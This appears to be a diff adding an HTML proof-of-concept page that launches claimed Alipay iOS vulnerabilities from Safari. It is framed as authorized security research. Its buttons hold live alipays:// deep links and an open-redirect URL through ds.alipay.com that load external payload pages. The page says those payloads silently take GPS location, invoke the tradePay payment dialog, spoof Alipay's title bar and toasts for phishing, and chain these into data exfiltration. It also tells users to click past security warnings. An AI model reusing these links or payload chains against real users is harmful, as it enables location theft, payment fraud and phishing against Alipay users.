@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="zh"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Alipay CVE PoC — iOS Verification</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,system-ui,sans-serif;background:#f0f2f5;color:#333;-webkit-text-size-adjust:100%}
+.c{max-width:500px;margin:0 auto;padding:12px}
+.hd{background:linear-gradient(135deg,#c41d2b,#8b0000);color:#fff;padding:16px;border-radius:12px;text-align:center;margin-bottom:12px}
+.hd h1{font-size:17px;margin-bottom:4px}
+.hd p{font-size:11px;opacity:.85}
+.card{background:#fff;border-radius:10px;padding:14px;margin-bottom:10px;box-shadow:0 1px 6px rgba(0,0,0,.08)}
+.card h3{font-size:13px;color:#1677ff;margin-bottom:6px}
+.card .desc{font-size:11px;color:#888;margin-bottom:8px;line-height:1.4}
+.btn{display:block;width:100%;padding:13px;border-radius:8px;text-decoration:none;font-size:14px;color:#fff;font-weight:600;text-align:center;margin:6px 0;border:none}
+.r{background:#f5222d}.b{background:#1677ff}.p{background:#722ed1}.g{background:#52c41a}.o{background:#fa8c16}
+.tag{display:inline-block;font-size:9px;padding:2px 6px;border-radius:3px;color:#fff;margin-left:4px;vertical-align:middle}
+.tag-c{background:#f5222d}.tag-h{background:#fa541c}
+.warn{background:#fff7e6;border:1px solid #ffd591;border-radius:8px;padding:10px;font-size:11px;color:#d46b08;margin:10px 0;line-height:1.5}
+.info{background:#e6f7ff;border:1px solid #91d5ff;border-radius:8px;padding:10px;font-size:11px;color:#096dd9;margin:10px 0;line-height:1.5}
+.steps{counter-reset:s}
+.step{display:flex;gap:8px;padding:6px 0;border-bottom:1px solid #f5f5f5;counter-increment:s}
+.step:last-child{border:none}
+.step::before{content:counter(s);background:#f5222d;color:#fff;min-width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:bold}
+.step p{font-size:11px;color:#555;line-height:1.5}
+.step b{color:#333}
+.divider{height:1px;background:#f0f0f0;margin:10px 0}
+.ft{text-align:center;color:#bbb;font-size:9px;padding:16px;line-height:1.6}
+.cve-id{font-family:monospace;font-size:10px;color:#999;display:block;margin-top:2px}
+</style>
+</head><body>
+<div class="c">
+
+<div class="hd">
+  <h1>Alipay DeepLink/JSBridge CVE PoC</h1>
+  <p>iOS Safari Verification | MITRE Ticket #2005801</p>
+  <p style="margin-top:4px;font-size:10px">Innora AI Security Research | 2026-03-16</p>
+</div>
+
+<div class="card">
+  <h3>iOS Safari 录屏验证步骤</h3>
+  <div class="steps">
+    <div class="step"><p><b>开始iOS录屏</b>（控制中心 → 录屏按钮）</p></div>
+    <div class="step"><p><b>确认已安装支付宝</b>（任意版本均可）</p></div>
+    <div class="step"><p><b>逐个点击下方按钮</b>，每个按钮对应一个CVE</p></div>
+    <div class="step"><p>支付宝自动打开 → <b>观察WebView中的结果</b></p></div>
+    <div class="step"><p>若出现拦截页面，<b>点击"继续访问"</b></p></div>
+    <div class="step"><p>返回Safari → 测试下一个CVE</p></div>
+  </div>
+</div>
+
+<div class="warn">
+  <b>重要说明：</b>此PoC仅在已安装支付宝的设备上生效。点击按钮后支付宝会自动打开。
+  所有测试均为安全研究目的，不会修改任何数据。tradePay测试使用无效订单号，不会产生真实扣款。
+</div>
+
+<!-- CVE-1: DeepLink URL Scheme Bypass -->
+<div class="card">
+  <h3>CVE-1: DeepLink URL Scheme 绕过 <span class="tag tag-c">CVSS 9.1</span></h3>
+  <span class="cve-id">CWE-939 | MITRE Ticket #2005801</span>
+  <p class="desc">外部浏览器通过 alipays:// 直接打开支付宝内部页面，无需任何认证。证明 SchemeServiceImpl.process(Uri) 不验证来源。</p>
+
+  <a class="btn r" href="alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/payload_cve1.html">
+    Test 1A: 加载外部URL到WebView
+  </a>
+
+  <a class="btn o" href="alipays://platformapi/startapp?appId=20000153">
+    Test 1B: 直接打开联系人页面
+  </a>
+
+  <a class="btn o" href="alipays://platformapi/startapp?appId=20000003">
+    Test 1C: 直接打开账单页面
+  </a>
+
+  <a class="btn o" href="alipays://platformapi/startapp?appId=20000186">
+    Test 1D: 直接打开扫码器
+  </a>
+</div>
+
+<!-- CVE-2: GPS Silent Exfiltration -->
+<div class="card">
+  <h3>CVE-2: GPS静默外泄 <span class="tag tag-c">CVSS 7.4</span></h3>
+  <span class="cve-id">CWE-359 | iOS关键测试</span>
+  <p class="desc">通过DeepLink加载的外部页面调用 getLocation JSAPI，静默获取GPS坐标。iOS如果之前授权过支付宝定位，无需再次弹窗。</p>
+
+  <a class="btn r" href="alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/payload_cve2.html">
+    Test 2: GPS定位外泄测试
+  </a>
+</div>
+
+<!-- CVE-3: tradePay Unauthorized Payment -->
+<div class="card">
+  <h3>CVE-3: tradePay未授权支付调用 <span class="tag tag-h">CVSS 8.6</span></h3>
+  <span class="cve-id">CWE-940 | 支付安全</span>
+  <p class="desc">外部加载的页面调用 tradePay JSAPI 可触发真实支付对话框。使用无效订单号，不会产生真实扣款。</p>
+
+  <a class="btn r" href="alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/payload_cve3.html">
+    Test 3: tradePay支付调用测试
+  </a>
+</div>
+
+<!-- CVE-4: UI Spoofing -->
+<div class="card">
+  <h3>CVE-4: UI欺骗 (setTitle/showToast) <span class="tag tag-h">CVSS 8.1</span></h3>
+  <span class="cve-id">CWE-451 | UI安全</span>
+  <p class="desc">攻击者页面可修改支付宝原生标题栏和弹出系统级Toast，实现钓鱼攻击。用户会以为是支付宝官方提示。</p>
+
+  <a class="btn p" href="alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/payload_cve4.html">
+    Test 4: 标题栏+Toast欺骗测试
+  </a>
+</div>
+
+<!-- CVE-5: End-to-End Data Exfiltration -->
+<div class="card">
+  <h3>CVE-5: 端到端数据外泄链 <span class="tag tag-h">CVSS 8.6</span></h3>
+  <span class="cve-id">CWE-200 | 数据泄漏</span>
+  <p class="desc">组合CVE-2+3+4，单页面同时调用多个JSAPI收集GPS、设备信息、触发支付、伪造UI，演示完整攻击链。</p>
+
+  <a class="btn r" href="alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/payload_cve5.html">
+    Test 5: 完整攻击链测试
+  </a>
+</div>
+
+<!-- CVE-6: ds.alipay.com Whitelist Bypass -->
+<div class="card">
+  <h3>CVE-6: ds.alipay.com 白名单绕过 <span class="tag tag-c">CVSS 9.3</span></h3>
+  <span class="cve-id">CWE-601 + CWE-939 | 绕过防护</span>
+  <p class="desc">ds.alipay.com在白名单中(stripLandingConfig)，其开放重定向功能可将用户导向任意URL，绕过域名校验。</p>
+
+  <a class="btn r" href="https://ds.alipay.com/?scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FappId%3D20000067%26url%3Dhttps%3A%2F%2Finnora.ai%2Fzfb%2Fpoc%2Fpayload_cve6.html">
+    Test 6A: ds.alipay.com重定向链
+  </a>
+
+  <a class="btn o" href="alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/payload_cve6.html">
+    Test 6B: 直接DeepLink (对照组)
+  </a>
+</div>
+
+<div class="info">
+  <b>录屏要点：</b><br>
+  1. 每个测试前确保Safari地址栏可见（证明从外部浏览器触发）<br>
+  2. 如果出现"是否打开支付宝"弹窗，点击"打开"<br>
+  3. 如果出现安全拦截页面，截图后点击"继续访问"<br>
+  4. 注意观察WebView中显示的结果信息
+</div>
+
+<div class="ft">
+  Authorized Security Research — Innora AI Security Team<br>
+  MITRE Ticket #2005801 | feng@innora.ai<br>
+  PoC hosted at innora.ai via Cloudflare HTTPS<br>
+  2026-03-16
+</div>
+
+</div>
+</body></html>
